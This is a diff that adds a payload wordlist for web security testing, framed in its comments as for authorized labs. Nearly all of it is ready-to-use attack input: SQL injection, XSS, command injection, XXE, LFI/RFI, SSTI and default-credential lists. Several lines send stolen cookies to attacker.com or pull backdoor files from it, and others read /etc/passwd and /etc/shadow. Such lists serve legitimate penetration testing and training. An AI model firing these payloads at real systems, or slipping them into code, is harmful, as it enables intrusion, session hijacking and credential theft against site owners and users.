@@ -1,0 +1,203 @@
+# Educational Security Testing Payloads
+# Use only for authorized testing and educational purposes
+# Lines starting with # are comments
+
+# ===== SQL INJECTION PAYLOADS =====
+# Basic SQL injection attempts
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+admin'--
+admin"--
+' OR 'x'='x
+" OR "x"="x
+
+# Union-based SQL injection
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT user(),database(),version()--
+
+# Time-based blind SQL injection
+'; WAITFOR DELAY '00:00:05'--
+'; SELECT SLEEP(5)--
+' AND (SELECT SLEEP(5))--
+
+# Error-based SQL injection
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# ===== CROSS-SITE SCRIPTING (XSS) =====
+# Basic XSS payloads
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+javascript:alert('XSS')
+<iframe src=javascript:alert('XSS')>
+<body onload=alert('XSS')>
+
+# Advanced XSS payloads
+<script>document.location='http://attacker.com/'+document.cookie</script>
+<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>
+<script>fetch('http://attacker.com',{method:'POST',body:document.cookie})</script>
+
+# ===== LOCAL FILE INCLUSION (LFI) =====
+# Basic LFI attempts
+../../../etc/passwd
+..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+
+# LFI with null byte (older systems)
+../../../etc/passwd%00
+../../../etc/passwd%00.txt
+
+# LFI log poisoning
+../../../var/log/apache2/access.log
+../../../var/log/apache/access.log
+../../../var/log/httpd/access_log
+
+# ===== REMOTE FILE INCLUSION (RFI) =====
+# Basic RFI attempts (use with caution)
+http://attacker.com/shell.txt
+https://attacker.com/backdoor.php
+ftp://attacker.com/malicious.txt
+
+# ===== COMMAND INJECTION =====
+# Basic command injection
+; ls
+; cat /etc/passwd
+| whoami
+& dir
+`id`
+$(whoami)
+; ping -c 4 127.0.0.1
+| netstat -an
+
+# Windows command injection
+; dir
+& type C:\windows\system32\drivers\etc\hosts
+| whoami /all
+
+# ===== LDAP INJECTION =====
+# Basic LDAP injection
+*
+*)(uid=*))(|(uid=*
+*)(|(objectClass=*))
+*)(|(cn=*))
+
+# ===== XML INJECTION / XXE =====
+# Basic XXE payloads
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>
+
+# ===== NOSQL INJECTION =====
+# MongoDB injection
+{"$ne": null}
+{"$regex": ".*"}
+{"$where": "return true"}
+admin' || 'a'=='a
+
+# ===== AUTHENTICATION BYPASS =====
+# Common bypass attempts
+admin
+administrator
+root
+guest
+test
+demo
+user
+password
+123456
+admin123
+password123
+
+# SQL-based auth bypass
+admin'/*
+admin'#
+admin'--
+' or 1=1#
+' or 1=1--
+') or '1'='1--
+') or ('1'='1--
+
+# ===== DIRECTORY TRAVERSAL =====
+# Basic directory traversal
+../
+..\\
+....//
+....\\\\
+%2e%2e%2f
+%2e%2e%5c
+..%252f
+..%255c
+
+# ===== SERVER-SIDE TEMPLATE INJECTION (SSTI) =====
+# Basic SSTI payloads
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+{{config}}
+{{request}}
+{{self}}
+
+# ===== HTTP HEADER INJECTION =====
+# Basic header injection
+test\r\nX-Injected: true
+test\nLocation: http://attacker.com
+test%0d%0aX-Injected:%20true
+
+# ===== CRLF INJECTION =====
+# Basic CRLF injection payloads
+%0d%0a
+%0a
+%0d
+\r\n
+\n
+\r
+
+# ===== FORMAT STRING =====
+# Basic format string payloads
+%s%s%s%s
+%x%x%x%x
+%n%n%n%n
+%p%p%p%p
+
+# ===== BUFFER OVERFLOW PATTERNS =====
+# Basic overflow patterns
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+
+# ===== PATH TRAVERSAL =====
+# Windows path traversal
+..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+..\\..\\..\\boot.ini
+..\\..\\..\\windows\\win.ini
+
+# Linux path traversal
+../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../proc/version
+../../../etc/issue
+
+# ===== PROTOCOL HANDLERS =====
+# Various protocol handlers
+file://
+ftp://
+gopher://
+dict://
+ldap://
+jar://
+
+# Note: These payloads are for educational purposes only
+# Always ensure you have proper authorization before testing
+# Use responsibly in controlled environments like TryHackMe, HackTheBox, or your own lab
